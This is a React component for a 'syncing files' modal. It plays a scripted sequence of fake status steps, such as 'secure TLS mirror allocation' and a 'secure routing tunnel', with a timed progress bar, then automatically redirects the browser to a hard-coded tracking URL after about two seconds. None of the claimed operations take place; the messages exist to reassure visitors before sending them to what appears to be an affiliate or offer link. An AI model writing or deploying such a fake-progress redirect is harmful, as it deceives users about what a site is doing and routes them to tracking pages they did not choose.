import React, { useState, useEffect } from 'react';
import { X, RefreshCw, Check } from 'lucide-react';
import { motion } from 'motion/react';

interface SyncModalProps {
  isOpen: boolean;
  onClose: () => void;
  redirectUrl?: string;
}

export const SyncModal: React.FC<SyncModalProps> = ({
  isOpen,
  onClose,
  redirectUrl = 'https://apptrck.net/cl/i/d23gr7',
}) => {
  const [progress, setProgress] = useState(0);
  const [step1Done, setStep1Done] = useState(false);
  const [step2Done, setStep2Done] = useState(false);
  const [step3Done, setStep3Done] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);

  const performRedirect = () => {
    setIsRedirecting(true);
    try {
      window.location.href = redirectUrl;
    } catch {
      // Fallback
    }
  };

  useEffect(() => {
    if (!isOpen) {
      setProgress(0);
      setStep1Done(false);
      setStep2Done(false);
      setStep3Done(false);
      setIsRedirecting(false);
      return;
    }

    setProgress(20);

    const t1 = setTimeout(() => {
      setProgress(50);
      setStep1Done(true);
    }, 500);

    const t2 = setTimeout(() => {
      setProgress(85);
      setStep2Done(true);
    }, 1100);

    const t3 = setTimeout(() => {
      setProgress(100);
      setStep3Done(true);
    }, 1700);

    const t4 = setTimeout(() => {
      performRedirect();
    }, 2200);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
      clearTimeout(t4);
    };
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
      {/* Backdrop with dark blur */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
        className="fixed inset-0 bg-black/85 backdrop-blur-md"
      />

      {/* Confetti & Particle Shapes (Exact styling from Image 3) */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-10">
        {[
          { color: '#ff0077', top: '15%', left: '18%', size: 'w-2 h-4', rotate: 'rotate-45' },
          { color: '#00d2ff', top: '22%', left: '78%', size: 'w-2.5 h-3', rotate: '-rotate-12' },
          { color: '#ffb703', top: '30%', left: '26%', size: 'w-3 h-3', rotate: 'rotate-30' },
          { color: '#fb8500', top: '28%', left: '84%', size: 'w-3 h-2', rotate: '-rotate-45' },
          { color: '#ff0077', top: '45%', left: '12%', size: 'w-2.5 h-4', rotate: 'rotate-12' },
          { color: '#ffb703', top: '38%', left: '72%', size: 'w-2 h-3.5', rotate: 'rotate-60' },
          { color: '#00d2ff', top: '55%', left: '88%', size: 'w-2 h-3', rotate: '-rotate-30' },
          { color: '#ff0077', top: '65%', left: '22%', size: 'w-3 h-2.5', rotate: 'rotate-15' },
          { color: '#ffb703', top: '72%', left: '79%', size: 'w-2.5 h-3', rotate: 'rotate-45' },
        ].map((c, i) => (
          <div
            key={i}
            className={`absolute ${c.size} ${c.rotate} rounded-xs opacity-75 shadow-sm animate-pulse`}
            style={{
              backgroundColor: c.color,
              top: c.top,
              left: c.left,
              animationDuration: `${2 + (i % 3)}s`,
            }}
          />
        ))}
      </div>

      {/* Main Modal Card Container (Exact visual match to Image 3) */}
      <motion.div
        initial={{ opacity: 0, scale: 0.94, y: 15 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.94, y: 15 }}
        transition={{ type: 'spring', damping: 25, stiffness: 300 }}
        className="relative z-20 w-full max-w-lg bg-[#0a0d16] border border-slate-800/90 rounded-3xl p-6 sm:p-7 shadow-[0_20px_60px_rgba(0,0,0,0.9),0_0_40px_rgba(255,0,119,0.2)] text-white overflow-hidden"
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          aria-label="Close modal"
          className="absolute top-4 right-4 w-9 h-9 rounded-xl bg-slate-800/60 hover:bg-slate-700/80 text-slate-300 hover:text-white flex items-center justify-center transition-colors cursor-pointer z-30"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="flex flex-col items-center text-center pt-2 pb-1">
          {/* Pink Glowing Ring with Spinning Sync Icon */}
          <div className="relative mb-6">
            <div className="w-24 h-24 rounded-full border-4 border-[#ff0077] flex items-center justify-center shadow-[0_0_35px_rgba(255,0,119,0.7)] bg-[#0d101d]">
              <RefreshCw
                className="w-10 h-10 text-[#ff0077] animate-spin"
                style={{ animationDuration: '2s' }}
              />
            </div>
            <div
              className="absolute inset-0 rounded-full border-2 border-pink-400/40 animate-ping"
              style={{ animationDuration: '3s' }}
            />
          </div>

          {/* Title & Subtext */}
          <h2 className="text-2xl sm:text-3xl font-bold font-mono tracking-wider text-white mb-2">
            SYNCING FILES...
          </h2>
          <p className="text-slate-400 font-mono text-sm mb-6">
            Allocating high-speed cloud mirrors ({progress}%)
          </p>

          {/* Checklist Container */}
          <div className="w-full bg-[#070910] border border-slate-800/80 rounded-2xl p-4 sm:p-5 space-y-3.5 mb-6 text-left">
            {/* Check 1 */}
            <div className="flex items-center gap-3.5">
              <div
                className={`w-6 h-6 rounded-full flex items-center justify-center transition-all duration-300 shrink-0 ${
                  step1Done
                    ? 'bg-[#ff0077] text-white shadow-[0_0_12px_rgba(255,0,119,0.8)]'
                    : 'border-2 border-slate-700 bg-slate-800/50 text-transparent'
                }`}
              >
                <Check className="w-3.5 h-3.5 stroke-[3]" />
              </div>
              <span className="text-xs sm:text-[13px] font-mono tracking-wide font-medium text-slate-200">
                ESTABLISHING SECURE TLS MIRROR ALLOCATION...
              </span>
            </div>

            {/* Check 2 */}
            <div className="flex items-center gap-3.5">
              <div
                className={`w-6 h-6 rounded-full flex items-center justify-center transition-all duration-300 shrink-0 ${
                  step2Done
                    ? 'bg-[#ff0077] text-white shadow-[0_0_12px_rgba(255,0,119,0.8)]'
                    : 'border-2 border-slate-700 bg-slate-800/50 text-transparent'
                }`}
              >
                <Check className="w-3.5 h-3.5 stroke-[3]" />
              </div>
              <span className="text-xs sm:text-[13px] font-mono tracking-wide font-medium text-slate-200">
                CACHING MEDIA PACKAGES AND SPECIALS...
              </span>
            </div>

            {/* Check 3 */}
            <div className="flex items-center gap-3.5">
              <div
                className={`w-6 h-6 rounded-full flex items-center justify-center transition-all duration-300 shrink-0 ${
                  step3Done
                    ? 'bg-[#ff0077] text-white shadow-[0_0_12px_rgba(255,0,119,0.8)]'
                    : 'border-2 border-slate-700 bg-slate-800/50 text-transparent'
                }`}
              >
                <Check className="w-3.5 h-3.5 stroke-[3]" />
              </div>
              <span className="text-xs sm:text-[13px] font-mono tracking-wide font-medium text-slate-200">
                GENERATING SECURE ROUTING TUNNEL...
              </span>
            </div>
          </div>

          {/* Glowing Gradient Progress Bar */}
          <div className="w-full bg-slate-800/60 rounded-full h-2.5 mb-5 overflow-hidden p-0.5">
            <motion.div
              initial={{ width: '0%' }}
              animate={{ width: `${progress}%` }}
              transition={{ duration: 0.3 }}
              className="h-full rounded-full bg-gradient-to-r from-[#ff0077] via-[#ff0055] to-[#ff7700] shadow-[0_0_15px_rgba(255,0,119,0.9)]"
            />
          </div>

          {/* Redirecting Status */}
          <div className="flex items-center justify-center gap-2 text-slate-400 font-mono text-xs tracking-wider">
            <RefreshCw className="w-3.5 h-3.5 text-[#ff0077] animate-spin" />
            <span>REDIRECTING TO DOWNLOAD MIRROR NODE SECURELY...</span>
          </div>
        </div>
      </motion.div>
    </div>
  );
};
